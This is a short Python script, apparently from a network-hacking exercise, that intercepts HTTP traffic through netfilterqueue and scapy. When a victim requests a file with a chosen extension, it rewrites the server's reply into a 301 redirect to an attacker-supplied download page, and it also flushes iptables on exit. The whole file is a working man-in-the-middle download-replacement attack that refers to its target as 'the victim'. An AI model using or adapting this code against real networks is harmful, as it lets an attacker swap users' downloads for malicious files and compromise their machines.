#!/usr/bin/env python
import netfilterqueue
import sys
import argparse
import subprocess
import scapy.all as scapy

def getargs() :
    parser=argparse.ArgumentParser()
    parser.add_argument("--extension","-x",dest="ext",help="Specify the extension the victim will download")
    parser.add_argument("--page","-p",dest="download",help="Specify the alternative download page")
    opt=parser.parse_args()
    if not opt.ext or not opt.download :
        parser.error("[-]Specify all arguments !")
    else :
        return opt    
ack=[]
opt=getargs()
def process_queue (packet) :
    try:
        scapy_packet=scapy.IP(packet.get_payload())
        print(scapy_packet.show())
        ext="."+opt.ext
        if scapy_packet[scapy.TCP].dport == 80 :
            if scapy_packet.haslayer(scapy.Raw) :
                if  ext in scapy_packet[scapy.Raw].load :
                    print("[+] Found a file download request !")
                    ack.append(scapy_packet[scapy.TCP].ack)
                    

        elif scapy_packet[scapy.TCP].sport == 80 :
            if scapy_packet[scapy.TCP].seq in ack :
                print("[+] Replacing file ..")
                scapy_packet[scapy.Raw].load="HTTP/1.1 301 Moved Permanently\nLocation:" + opt.download +"\n\n"
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.TCP].chksum
                del scapy_packet[scapy.IP].chksum
                ack.remove(scapy_packet[scapy.TCP].seq)
                packet.set_payload(str(scapy_packet))
        packet.accept()
    except IndexError,AttributeError :
        pass 

try:
  #  subprocess.call(["iptables","-I","FORWARD","-j","NFQUEUE","--queue-num","0"])
    queue=netfilterqueue.NetfilterQueue()
    queue.bind(0,process_queue)
    queue.run()
except KeyboardInterrupt:
    print("[+] Restoring everything to normal")
    subprocess.call(["iptables","--flush"])